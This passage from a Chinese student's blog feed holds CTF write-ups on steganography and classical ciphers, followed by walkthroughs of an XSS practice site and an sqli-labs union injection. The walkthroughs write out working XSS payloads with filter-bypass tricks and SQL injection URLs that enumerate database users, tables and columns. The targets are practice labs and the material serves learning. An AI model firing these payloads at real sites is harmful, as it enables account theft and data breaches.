      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku杂项(一)</title>
      <link href="2019/07/14/Bugku%E6%9D%82%E9%A1%B9/"/>
      <url>2019/07/14/Bugku%E6%9D%82%E9%A1%B9/</url>
      
        <content type="html"><![CDATA[<h5 id="1、这是一张单纯的图片"><a href="#1、这是一张单纯的图片" class="headerlink" title="1、这是一张单纯的图片"></a>1、这是一张单纯的图片</h5><p><img src="http://img1002-c.pocoimg.cn/image/poco/works/96/2019/0714/19/15631022921926420_201104351_H800.png" alt="在这里插入图片描述"><br>将图片保存到本地，使用winhex打开图片，在末尾发现了一组数据信息<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/96/2019/0714/19/15631022923403416_201104351_H800.png" alt="在这里插入图片描述"><br><code>&amp;#107;&amp;#101;&amp;#121;&amp;#123;&amp;#121;&amp;#111;&amp;#117;&amp;#32;&amp;#97;&amp;#114;&amp;#101;&amp;#32;&amp;#114;&amp;#105;&amp;#103;&amp;#104;&amp;#116;&amp;#125;</code><br> 这是HTML的编码，可以通过游览器解析拿到flag；<br> <strong>步骤</strong>：新建文本文档，把上面的编码放进去，更改后缀名为html,双击打开即可<img src="http://img1002-c.pocoimg.cn/image/poco/works/96/2019/0714/19/15631022926900577_201104351_H800.png" alt="在这里插入图片描述"></p><h5 id="2、隐写"><a href="#2、隐写" class="headerlink" title="2、隐写"></a>2、隐写</h5><p><img src="http://img1002-c.pocoimg.cn/image/poco/works/96/2019/0714/19/15631022928856505_201104351_H800.png" alt="在这里插入图片描述"><br> 下载压缩包 打开，一张图片：<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/96/2019/0714/19/15631022921680398_201104351_H800.png" alt="这里这张图是截图，原图放上显示不出来"><br>既然题目提示为隐写，那就直接用winhex打开吧<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/96/2019/0714/19/15631022927135178_201104351_H800.png" alt="在这里插入图片描述"><br><code>89504e47</code> 是png图片的没有问题，因为是隐写题 所以图片的宽高应该被改了；查看PNG文件格式，IHDR后面的八个字节就是宽高的值 <img src="http://img1002-c.pocoimg.cn/image/poco/works/96/2019/0714/19/15631022925580290_201104351_H800.png" alt="在这里插入图片描述"> 即 </p><blockquote><p>宽：000001F4   高：000001A4</p></blockquote><p>将图片的高改成和宽一样,即将A4改成F4，然后另存为，打开刚存的图片就可以得到flag了<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/96/2019/0714/19/15631022926796820_201104351_H800.png" alt="在这里插入图片描述"></p><h5 id="3、啊哒"><a href="#3、啊哒" class="headerlink" title="3、啊哒"></a>3、啊哒</h5><p><img src="http://img1002-c.pocoimg.cn/image/poco/works/96/2019/0714/19/15631022923627383_201104351_H800.png" alt="在这里插入图片描述"><br>下载文件打开，也是一张图片<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/96/2019/0714/19/15631022929199235_201104351_H1920.jpg" alt="在这里插入图片描述"><br>将图片放进winhex、notepad++打开都没发现什么，用binwalk分析下<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/96/2019/0714/19/15631022921064837_201104351_H1920.png" alt="在这里插入图片描述"><br> 发现包含有压缩包，使用dd命令分离文件<img src="http://img1002-c.pocoimg.cn/image/poco/works/96/2019/0714/19/15631022926086238_201104351_H800.png" alt="在这里插入图片描述"><br>得到压缩包，打开发现需要密码    ￣へ￣  ，无奈，只能从图片上找问题，属性→详细信息，发现一串16进制数<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/96/2019/0714/19/15631022925306386_201104351_H800.png" alt="在这里插入图片描述"><br>这应该就是密码(‾◡◝)尝试16进制转字符串（密码一般都是字符串）<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/96/2019/0714/19/15631022926929820_201104351_H800.png" alt="在这里插入图片描述"><br>输入解出的字符串，OK 成功得到flagヾ(≧▽≦*)o</p>]]></content>
      
      
      <categories>
          
          <category> CTF刷题 </category>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku密码学（一）</title>
      <link href="2019/07/14/Bugku%E5%AF%86%E7%A0%81%E5%AD%A6(%E4%B8%80)/"/>
      <url>2019/07/14/Bugku%E5%AF%86%E7%A0%81%E5%AD%A6(%E4%B8%80)/</url>
      
        <content type="html"><![CDATA[<h5 id="1、滴答-滴"><a href="#1、滴答-滴" class="headerlink" title="1、滴答~滴"></a>1、滴答~滴</h5><p><img src="http://img1002-c.pocoimg.cn/image/poco/works/69/2019/0714/10/15630731171838583_201104351_H800.png" alt="在这里插入图片描述"><br>这题一看就是摩斯密码，直接用morse密码的在线工具 <a href="https://www.jb51.net/tools/morse.htm">工具地址</a><br>提交得flag （￣︶￣）↗　</p><h5 id="2、聪明的小羊"><a href="#2、聪明的小羊" class="headerlink" title="2、聪明的小羊"></a>2、聪明的小羊</h5><p><img src="http://img1002-c.pocoimg.cn/image/poco/works/69/2019/0714/10/15630731173061215_201104351_H800.png" alt="在这里插入图片描述"><br>看题目中的提示应该是栅栏密码，且偏移量为二，直接使用Bugku里的工具解密，得到flag。</p><h5 id="3、OK"><a href="#3、OK" class="headerlink" title="3、OK"></a>3、OK</h5><p><img src="http://img1002-c.pocoimg.cn/image/poco/works/69/2019/0714/10/15630731171042226_201104351_H800.png" alt="在这里插入图片描述">直接用bugku的ook解密工具<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/69/2019/0714/10/15630731176840145_201104351_H800.png" alt="在这里插入图片描述"></p><h5 id="4、这不是摩斯密码"><a href="#4、这不是摩斯密码" class="headerlink" title="4、这不是摩斯密码"></a>4、这不是摩斯密码</h5><p><img src="http://img1002-c.pocoimg.cn/image/poco/works/69/2019/0714/10/15630731171214035_201104351_H800.png" alt="在这里插入图片描述"><br>打开是这样的：<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/69/2019/0714/10/15630731174803938_201104351_H800.png" alt="在这里插入图片描述"><br>百度得知这是brainfuck的东西，然后接着使用bugku的工具<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/69/2019/0714/10/15630731174435705_201104351_H800.png" alt="在这里插入图片描述"></p><h5 id="5、简单加密"><a href="#5、简单加密" class="headerlink" title="5、简单加密"></a>5、简单加密</h5><p><img src="http://img1002-c.pocoimg.cn/image/poco/works/69/2019/0714/10/15630731179839622_201104351_H800.png" alt="在这里插入图片描述"><br>这题乍一看没啥头绪，但是最后两位字符是我联想到了base64 加密，<code>A</code>的ASCII码为65，<code>=</code>的ASCII码为61，即需要先左移4位；<br>将字符转换为ASCII码：</p><pre><code>101,54,90,57,105,126,93,56,82,126,85,126,81,72,69,123,82,110,89,123,81,88,103,126,81,110,81,123,94,88,86,108,82,88,108,112,94,88,73,53,81,54,81,54,83,75,89,56,106,85,65,65</code></pre><p>再写个Python脚本解密</p><pre><code>import base64m=[101,54,90,57,105,126,93,56,82,126,85,126,81,72,69,123,82,110,89,123,81,88,103,126,81,110,81,123,94,88,86,108,82,88,108,112,94,88,73,53,81,54,81,54,83,75,89,56,106,85,65,65]flag=&#39;&#39;i=4for j in m:    flag+=chr(j-i)flag=base64.b64decode(flag).decode()print(flag)</code></pre><p>Ok，得到flag</p><h5 id="6、散乱的密文"><a href="#6、散乱的密文" class="headerlink" title="6、散乱的密文"></a>6、散乱的密文</h5><p><img src="http://img1002-c.pocoimg.cn/image/poco/works/69/2019/0714/10/15630731174029626_201104351_H800.png" alt="在这里插入图片描述">打开题目，嗯…密文确实挺散乱的，但还是感觉flag就在这里面，重点看第二句话“一张纸条上凌乱的写着2 1 6 5 3 4”，看到这，我们就能想起来，在古典密码中，有一种特使的加密方式是分组置换加密，嗯，没错，这题就是，而且这道题已经把分组的顺序告诉了我们。下面看解题过程：</p><p>|2 |1| 6| 5| 3| 4|<br>|–|–|–|–|–|–|–|<br>|l |f |5 |{ |a |g|<br>|0 | 2| 4|c |4 |8|<br>|3 | 5| 4|9 |d |7|<br>|f | d| @|@ |1 |}|<br>然后按照顺序读出来得到：flag{52048c453d794df1}@@<br>测试知后面@@应删去。</p>]]></content>
      
      
      <categories>
          
          <category> CTF刷题 </category>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实验吧--密码学</title>
      <link href="2019/07/14/%E5%AE%9E%E9%AA%8C%E5%90%A7--%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
      <url>2019/07/14/%E5%AE%9E%E9%AA%8C%E5%90%A7--%E5%AF%86%E7%A0%81%E5%AD%A6/</url>
      
        <content type="html"><![CDATA[<p>1、围在栅栏中的爱<br>2、古典密码<br>3、奇妙的音乐</p><a id="more"></a><p><strong>1、围在栅栏中的爱</strong></p><p>最近一直在好奇一个问题，QWE到底等不等于ABC？</p><pre><code>-.- .. --.- .-.. .-- - ..-. -.-. --.- --. -. ... --- --- </code></pre><p>flag格式：CTF{xxx}<br>emm… 密文一看就是摩斯密码，拿去解下密→<a href="https://www.jb51.net/tools/morse.htm">在线工具</a><br><img src="http://img-blog.csdnimg.cn/20190725152439836.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>解密结果<code>KIQLWTFCQGNSOO </code>  没思路了，翻了翻别人的blog知道了要进行<strong>QWE</strong>解密；<br><strong>QWE加密：</strong><br>从电脑键盘上的字母从Q开始数，顺序是Q W E R T Y U I。。。对应的字母顺序依次是A B C D E F G H 也就是说Q=A,W=B,E=C，依次类推。<br>拿去解密 →<a href="https://www.zjslove.com/3.decode/qwe/index.html">在线工具</a><br><img src="http://img-blog.csdnimg.cn/20190725154828273.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>接下来既然题目说了有关栅栏，那就拿去解下密<br><img src="http://img-blog.csdnimg.cn/20190725155139938.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>仔细观察 发现第一个解密内容是有信息的，去倒叙解密下：</p><pre><code>iloveshiyanbar</code></pre><p>OK  flag:<code>CTF&#123;iloveshiyanbar&#125;</code></p><p><strong>2、古典密码</strong><br>密文内容如下{79 67 85 123 67 70 84 69 76 88 79 85 89 68 69 67 84 78 71 65 72 79 72 82 78 70 73 69 78 77 125 73 79 84 65}<br>请对其进行解密<br>提示：<br>    1.加解密方法就在谜面中<br>    2.利用key值的固定结构</p><p>格式：CTF{ } <hr><br>这题挺有意思的；先将这些数字转换为ascii码字符：<code>OCU&#123;CFTELXOUYDECTNGAHOHRNFIENM&#125;IOTA</code><br>古典密码中最基础的加密法：<strong>列置换加密</strong>：将明文按固定长m分组，即每行m个字母，在密钥控制下按某一顺序交换列，最后按列优先的顺序依次读出，产生了密文。<br>例： ABCDEFGHIJKL  共12位 将它们列为4行3列（当然也可以是2x6，有多种可能）</p><pre><code>1 2 3 4A B C DE F G HI J K L</code></pre><p>改变一下列的顺序</p><pre><code>2 1 4 3B A D CF E H GJ I L K</code></pre><p>就是这样，解密的话只需要找出列的顺序还原下就好了。这题提示了 <strong>利用key值的固定结构</strong>即根据CTF三个首字符找出顺序<br>密文一共35位 那就有两种排列方式7x5 或 5x7<br>先来试试7x5<br>得到如下结果：</p><pre><code>1 2 3 4 5 6 7O C U &#123; C F TE L X O U Y DE C T N G A HO H R N F I EN M &#125; I O T A</code></pre><p> key值的固定结构为CTF{}<br>故第2列打头或第5列打头，接下来是第7列，然后是第6列，考虑到“{”是第4列，考虑到“}”是最后一列<br>尝试后得到<br><strong>1234567</strong>列转换为<strong>2764513</strong><br>即为：</p><pre><code>2 7 6 4 5 1 3C T F &#123; C O UL D Y O U E XC H A N G E TH E I N F O R M A T I O N &#125;</code></pre><blockquote><p>CTF{COULDYOUEXCHANGETHEINFORMATION}</p></blockquote><p> could you exchange the information ？为有意义的句子，提交flag正确。<br> 至于另一种，5x7情况下，因为CTF三个字符没在在首列，所以排除这种情况！</p><pre><code>  12345  OCU&#123;C  FTELX  OUYDE  CTNGA  HOHRN  FIENM  &#125;IOTA</code></pre><p><strong>3、奇妙的音乐</strong><br>据说flag就藏在这段音乐中，请仔细听。</p><p>格式：CTF{}</p><p>解题链接： <a href="http://ctf5.shiyanbar.com/crypto/123.zip">http://ctf5.shiyanbar.com/crypto/123.zip</a><br>这题很简单，本来不想写的，但还是记录下比较好<br>点击链接 下载一个压缩包，打开里面一张图片和一段加密音频文件<br><img src="http://img-blog.csdnimg.cn/20190725231236174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开图片：<br><img src="http://img-blog.csdnimg.cn/20190725231300356.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>下面有很多小点，因为海伦•凯勒是聋哑人，所以下面应该是盲文，百度找找盲文对照表<br><img src="http://img-blog.csdnimg.cn/20190725231912276.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>对照表密文为 <code>kmdonowg</code> 成功打开音频文件，听了一下，应该是摩斯密码<br>用Au打开，查看音谱图<br><img src="http://img-blog.csdnimg.cn/20190726132809508.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里把界面调窄一点的话会更清楚，即<br><img src="http://img-blog.csdnimg.cn/20190726133033572.png" alt="在这里插入图片描述"><br>手动打出密文：<code>-.-.  -  ..-.  .--   .--. .   ..  -----   ---..   --...   ...--   ..---  ..--..   ..---   ...--  -..  --..   </code><br>解码得：<code>CTFWPEI08732?23DZ</code>  大写提交不通过，换成小写flag：<code>CTF&#123;wpei08732?23dz&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF刷题 </category>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS闯关记录 超详细！</title>
      <link href="2019/07/13/XSS%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%20%E8%B6%85%E8%AF%A6%E7%BB%86%EF%BC%81/"/>
      <url>2019/07/13/XSS%E9%97%AF%E5%85%B3%E8%AE%B0%E5%BD%95%20%E8%B6%85%E8%AF%A6%E7%BB%86%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>时间过的真快(。&gt;︿&lt;)一转眼大一就过去了。趁着这个暑假好好补补课，先练习一下XSS注入(ง •_•)ง   →<a href="http://test.xss.tv/">练习地址</a></p><hr>   <p><strong>1、关于XSS攻击:</strong></p><p>XSS攻击全称跨站脚本攻击，是为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS，XSS是一种在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。</p><p><strong>2、XSS类型</strong><br>1)<code>反射型XSS</code></p><p> 反射型XSS只是简单地将用户输入的数据直接或未经完善的安全过滤就在浏览器中进行输出，导致输出的数据中存在可被浏览器执行的代码数据。由于此种类型的跨站代码存在于URL中，所以黑客通常需要通过诱骗或加密变形等方式将存在恶意代码的链接发给用户，只有用户点击以后才能使得攻击成功实施。</p><p>2)<code>存储型XSS</code></p><p>存储型XSS脚本攻击是指由于Web应用程序对用户输入数据的不严格，导致Web应用程序将黑客输入的恶意跨站攻击数据信息保存在服务端的数据库或其他文件形式中，当网页进行数据查询展示时，会从数据库中获取数据内容，并将数据内容在网页中进行输出展示，进而导致跨站脚本代码的执行。</p><p>3)<code>DOM Based XSS</code></p><p>基于DOM的XSS跨站脚本攻击是通过修改页面。DOM节点数据信息而形成的XSS跨站脚本攻击。不同于反射型XSS和存储型XSS，基于DOM的XSS跨站脚本攻击往往需要针对具体的Javascript DOM代码进行分析，并根据实际情况进行XSS跨站脚本攻击的利用。</p><p><strong>3、XSS攻击目的</strong></p><p>1.XSS盗取用户信息<br>2.XSS盗取Cookie<br>3.XSS钓鱼攻击<br>4.XSS蠕虫攻击</p><hr>好，说完这些就开始我们的闯关之路吧！<p><strong>Level 1</strong><br><img src="http://img1002-c.pocoimg.cn/image/poco/works/74/2019/0714/10/15630712166921488_201104351_H800.png" alt="在这里插入图片描述"><br>第一题很简单，没有任何过滤，直接构造命令</p><pre><code>http://test.xss.tv/level1.php?name= &lt;script&gt; alert(1) &lt;/script&gt;test</code></pre><p><img src="http://img1002-c.pocoimg.cn/image/poco/works/74/2019/0714/10/15630712167668567_201104351_H800.png" alt="在这里插入图片描述"><br>该注入产生的原因是由于程序员没有过滤或用引号包裹参数，所输入代码被直接执行，导致形成XSS漏洞。</p><p><strong>level 2</strong><br><img src="http://img1002-c.pocoimg.cn/image/poco/works/74/2019/0714/10/15630712169005068_201104351_H800.png" alt="在这里插入图片描述"><br>右键查看源码，发现<br><code>&lt;input name=keyword  value=&quot;test&quot;&gt;</code><br>即需要构造闭合代码命令：<br><code>http://test.xss.tv/level2.php?keyword=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;test</code><br><img src="http://img1002-c.pocoimg.cn/image/poco/works/74/2019/0714/10/15630712165357112_201104351_H800.png" alt="在这里插入图片描述"><br>带有<code>&lt;input&gt;</code>标签的GET型XSS需要闭合参数才能进行注入。普通的GET型可直接被解析。</p><p><strong>Level 3</strong><br><img src="http://img1002-c.pocoimg.cn/image/poco/works/74/2019/0714/10/15630712163314958_201104351_H800.png" alt="在这里插入图片描述"><br>先查看源码：</p><pre><code>&lt;input name=keyword  value=&#39;&#39;&gt;&lt;input type=submit name=submit value=搜索 /&gt;</code></pre><p>这里接着使用上一关方法注入，但要注意的是表单提交并没有<code>name=writing</code>的 因此需要把<code>wrting</code>改成<code>keyword</code><br>构造命令：<br><code>http://test.xss.tv/level3.php? keyword=&#39;&gt;&lt;script&gt;alert(1)&lt;/script&gt;wait</code><br>然而并没有成功，产查看源码发现尖括号被解析了</p><pre><code>&lt;input name=keyword  value=&#39;&#39;&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;wait&#39;&gt;&lt;input type=submit name=submit value=搜索 /&gt;</code></pre><p>因此这里我们采用 <code>onclick</code>触发事件 <code>onclick</code> 事件直接包含在&lt;&gt;内，可直接被执行。观察源代码为单引号，把value给闭合掉。<br>构造命令：</p><pre><code>http://test.xss.tv/level3.php? keyword=&#39;onclick=&#39;javascript:alert(1)&#39;</code></pre><p><img src="http://img1002-c.pocoimg.cn/image/poco/works/74/2019/0714/10/15630712168127283_201104351_H800.png" alt="在这里插入图片描述"><br> 🆗注入成功，ps：onclick触发事件需要<strong>点击一下输入框才</strong>能被触发</p><p><strong>Level 4</strong><br><img src="http://img1002-c.pocoimg.cn/image/poco/works/74/2019/0714/10/15630712161377989_201104351_H800.png" alt="在这里插入图片描述"><br>老套路，先查看网页源码，发现：</p><pre><code>&lt;form action=level4.php method=GET&gt;&lt;input name=keyword  value=&quot;try harder!&quot;&gt;</code></pre><p>这里我们先采取一般的注入方法，发现和上题一样尖括号也被过滤了，接着使用<code>onclick</code>事件；注意这里的闭合方式为双引号。</p><p><img src="http://img1002-c.pocoimg.cn/image/poco/works/74/2019/0714/10/15630712167604923_201104351_H800.png" alt="在这里插入图片描述"><br>ok，下一题</p><p><strong>Level 5</strong><br><img src="http://img1002-c.pocoimg.cn/image/poco/works/74/2019/0714/10/15630712162806799_201104351_H800.png" alt="在这里插入图片描述"><br>同样的套路把上面的两种方法都试试，没有成功。查看源码：<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/74/2019/0714/10/15630712163674423_201104351_H1920.png" alt="在这里插入图片描述"><br>发现这里对<code>on</code> 进行了过滤，变成了<code>o_n</code>,于是我们采用链接的形式进行注入<br>构造语句：</p><pre><code>http://test.xss.tv/level5.php?keyword=&quot;&gt;&lt;a href=javascript:alert(1)&gt;</code></pre><p><img src="http://img1002-c.pocoimg.cn/image/poco/works/74/2019/0714/10/15630712162806799_201104351_H800.png" alt="在这里插入图片描述"><br>点一下那个链接就行了，好的，下一关(●’◡’●)<br><strong>Level  6</strong><br><img src="http://img1002-c.pocoimg.cn/image/poco/works/74/2019/0714/10/15630712161445354_201104351_H800.png" alt="在这里插入图片描述"><br>这里我么们直接使用上题的注入方式，然后发现</p><pre><code>&lt;input name=keyword  value=&quot; &quot;&gt;&lt;a hr_ef=&quot;javascript:alert(1)&quot;&gt;&quot;&gt;&lt;input name=keyword  value=&quot; &quot;o_nclick=&#39;javascript:alert(1)&#39; &quot;&gt;&lt;input name=keyword  value=&quot; &quot;&lt;scr_ipt&gt; alert(1)&lt;/script&gt;&quot;&gt;</code></pre><p>发现这里的<strong>href    script    onclick</strong>  都被过滤了   可以尝试下大小写绕过 。<br>构造命令如下</p><pre><code>http://test.xss.tv/level6.php?keyword=&quot;ONclick=&quot;javascript:alert(1)&quot;</code></pre><p><img src="http://img1002-c.pocoimg.cn/image/poco/works/74/2019/0714/10/15630712161445354_201104351_H800.png" alt="在这里插入图片描述"><br>好了，next</p><p><strong>Level 7</strong><br><img src="http://img1002-c.pocoimg.cn/image/poco/works/74/2019/0714/10/15630712164270644_201104351_H800.png" alt="在这里插入图片描述"><br>同样的用上面三种方法进行注入，发现这题对 <strong>on  href   script</strong>     进行了完全屏蔽，但是魔高一尺，道高一丈（￣︶￣）↗　有人想出了双写绕过法。哈哈哈<br>构造命令如下：</p><pre><code>http://test.xss.tv/level7.php?keyword=&quot;&gt;&lt;sscriptcript&gt;alert(1)&lt;/sscriptcript&gt;</code></pre><p><img src="http://img1002-c.pocoimg.cn/image/poco/works/74/2019/0714/10/15630712161937933_201104351_H800.png" alt="在这里插入图片描述"><br>好的，下一关ヾ(≧▽≦*)o</p><p><strong>Level 8</strong><br><img src="http://img1002-c.pocoimg.cn/image/poco/works/74/2019/0714/10/15630712162629065_201104351_H800.png" alt="在这里插入图片描述"><br>这题接着尝试用上述方法试试，发现这题过滤了<code>&quot;  &lt;  &gt; </code>，emm… 有点恶心，查看源码发现<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/73/2019/0714/19/15631043825794517_201104351_H800.png" alt="在这里插入图片描述"><br>这里有个友情链接，可以发现，这里相当于一个<code>&lt;a&gt;</code>标签注入，那么我们直接输入<code>javascript:alert(1)</code>试试  ；<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/73/2019/0714/19/15631043824725694_201104351_H800.png" alt="在这里插入图片描述"><br>可以看到这里script被转义，试试大写绕过，不行；这里介绍一种新的注入方法：<strong>HTML字符转换绕过</strong>→ <a href="https://www.qqxiuzi.cn/bianma/zifushiti.php">地址</a> 网上一搜一大堆，将<code>script</code>转换为16进制，10进制也行（还可以使用url编码等其他网页语言）<br><strong>ps:这里要在输入框内输入。</strong></p><pre><code>java&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(1)</code></pre><p><img src="http://img1002-c.pocoimg.cn/image/poco/works/74/2019/0714/10/15630712166957247_201104351_H800.png" alt="在这里插入图片描述"><br>好的，下关。<br><strong>Level 9</strong><br><img src="http://img1002-c.pocoimg.cn/image/poco/works/74/2019/0714/10/15630712169921097_201104351_H800.png" alt="在这里插入图片描述"><br>直接输入上题代码；发现不行，查看源码<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/74/2019/0714/10/15630712169700182_201104351_H800.png" alt="在这里插入图片描述"><br>emmm没啥头绪，查看别人的blog知道这需要加<code>http://</code><br>构造命令</p><pre><code> java&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(1) // http://</code></pre><p><img src="http://img1002-c.pocoimg.cn/image/poco/works/74/2019/0714/10/15630712166388421_201104351_H800.png" alt="在这里插入图片描述"><br>ok 下关👇<br><strong>Level 10</strong><br><img src="http://img1002-c.pocoimg.cn/image/poco/works/74/2019/0714/10/15630712167469473_201104351_H800.png" alt="在这里插入图片描述"><br>尝试了几种方法之后发现 这题很绝，没有输出点<br>查看源码：<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/73/2019/0714/19/15631043824725694_201104351_H800.png" alt="在这里插入图片描述"><br> 在查看大佬的blog后知道了方法，首先构造代码</p><pre><code>&amp;t_link=&quot; text&quot; &amp;t_history=&quot;text&quot;&amp;t_sort=&quot;text&quot;</code></pre><p>测试哪个可以注入<br><img src="http://img1002-c.pocoimg.cn/image/poco/works/74/2019/0714/10/15630712166526974_201104351_H1920.png" alt="在这里插入图片描述"><br>这里<code>t_sort</code> 就是注入点，构造命令(ps:代码中有隐藏的参数设置,把hidden改为text)</p><pre><code>&amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert()</code></pre><p><img src="http://img1002-c.pocoimg.cn/image/poco/works/74/2019/0714/10/15630712165116927_201104351_H800.png" alt="在这里插入图片描述"><br>好啦，下面几关需要抓包，暂时还不会，加上近期有点忙，以后有时间补上（￣︶￣）↗　。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞原理 </category>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sqli-labs第一题详解</title>
      <link href="2019/06/10/Sqli-labs%E7%AC%AC%E4%B8%80%E9%A2%98%E8%AF%A6%E8%A7%A3/"/>
      <url>2019/06/10/Sqli-labs%E7%AC%AC%E4%B8%80%E9%A2%98%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>真的，很详细！(●’◡’●)</p><a id="more"></a><p>less1:<br>根据题目提示为单引号注入，先测试一下<br><img src="https://github.com/weiwanchengdege/photos/blob/master/20190604202334654.png?raw=true" alt="在这里插入图片描述"><br>果然报错了，说明我们添加的单引号被数据库成功解析，那我们就可以通过闭合id这个参数 ,然后构造自己的sql语句进行攻击。一般可以使用联合表的方式来提取自己想要的信息（union），但是使用union语句有个前提就是union 后面的语句必须与前面的语句字段数以及类型必须一直，否则数据库会报错。<br>那么知道这个我们就开始查字段吧<br>确定字段数一般可以使用order by 语句：<br><code>http://localhost/sqlilabs/Less-1/?id=1 order by 1 %23</code><br>执行成功<br><code>http://localhost/sqlilabs/Less-1/?id=1&#39; order by 2 %23</code><br>执行成功<br><code>http://localhost/sqlilabs/Less-1/?id=1&#39; order by 3 %23</code><br>执行成功<br><code>http://localhost/sqlilabs/Less-1/?id=1&#39; order by 4 %23</code><br>报错：<br><img src="https://github.com/weiwanchengdege/photos/blob/master/20190609193657260.png?raw=true" alt="在这里插入图片描述"><br>//注意这里使用  <code>#</code> 是不行的，游览器没有帮我们编码，所以我们自己编<br>   <code>%23</code> 为<code>#</code>的url编码，<code>--+</code>可以直接使用//</p><p>   即只有三个字段，那么现在开始联合查询：<br>   因为sql语句的执行结果<strong>只有第一行</strong>会被回显在页面上，所以我们要把原始语句的的结果        集变为空，这样我们想要的结果才能显示在界面上<br>   同时又需要确定哪几个字段会被显示在页面上：<br><img src="https://github.com/weiwanchengdege/photos/blob/master/20190609195252896.png?raw=true" alt="在这里插入图片描述"><br>   可以看出2，3字段被显示出来，<br>   接着爆数据库<img src="https://github.com/weiwanchengdege/photos/blob/master/20190609195604428.png?raw=true" alt="在这里插入图片描述"><br>   看到数据库名为：<strong>security</strong>，接着再查其他信息<br>   <code>http://localhost/sqli-labs/Less-1/ ?id=&#39;union select 1,2,concat_ws((char(32,58,32)),user(),database(),version())--+</code><br><img src="https://github.com/weiwanchengdege/photos/blob/master/20190609201140811.png?raw=true" alt="在这里插入图片描述"><br>   这里我使用了<strong>concat_ws()</strong> 函数：<br>  concat_ws(separator,str1,str2,…)<br>  第一个参数是其它参数的分隔符。分隔符的位置放在要连 接的两个字符串之间。分隔符可以是一个字符串，也可以是其它参数。<br>es:<br> select concat_ws(‘,’,’11’,’22’,’33’);   　11,22,33<br> **group_concat()**： 使多行数据在一列显示<br> char(32,58,32)对应ascill码为<code>空格：空格</code><br>user():返回当前数据库连接使用的用户<br>database():返回当前数据库连接使用的数据库<br>version():返回当前数据库的版本<br>OK 得到这些信息之后我们再来看看数据库有哪些表</p><pre><code>http://localhost/sqli-labs/Less-1/?id=&#39;union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</code></pre><p><img src="https://github.com/weiwanchengdege/photos/blob/master/2019060920432537.png?raw=true" alt="在这里插入图片描述"><br>可以看到有四张表，我们想要的信息基本都在<strong>user</strong>表下<br>我们对这张表爆列名：</p><pre><code>http://localhost/sqli-labs/Less-1/?id=0&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --+</code></pre><p><img src="https://github.com/weiwanchengdege/photos/blob/master/20190609211043656.png?raw=true" 